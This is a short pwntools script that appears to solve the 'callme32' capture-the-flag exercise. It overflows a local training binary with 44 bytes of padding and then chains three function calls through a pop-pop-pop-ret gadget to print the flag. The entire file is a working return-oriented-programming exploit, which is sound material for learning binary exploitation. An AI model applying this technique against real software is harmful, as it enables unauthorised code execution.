from pwn import *

elf = context.binary = ELF('callme32')

# Gotta love pwntools
callme1 = p32(elf.symbols.callme_one)
callme2 = p32(elf.symbols.callme_two)
callme3 = p32(elf.symbols.callme_three)

pop3_ret = p32(0x080488a9)

args = p32(1) + p32(2) + p32(3)

# Padding
shit = 'A'*44

rop  = callme1
rop += pop3_ret
rop += args

rop += callme2
rop += pop3_ret
rop += args

rop += callme3
rop += pop3_ret
rop += args

payload = shit + rop

io = process(elf.path)
io.sendline(payload)

# Read stuff
io.recvuntil("> ")
flag = io.recvall()

# Print flag
log.success(flag)
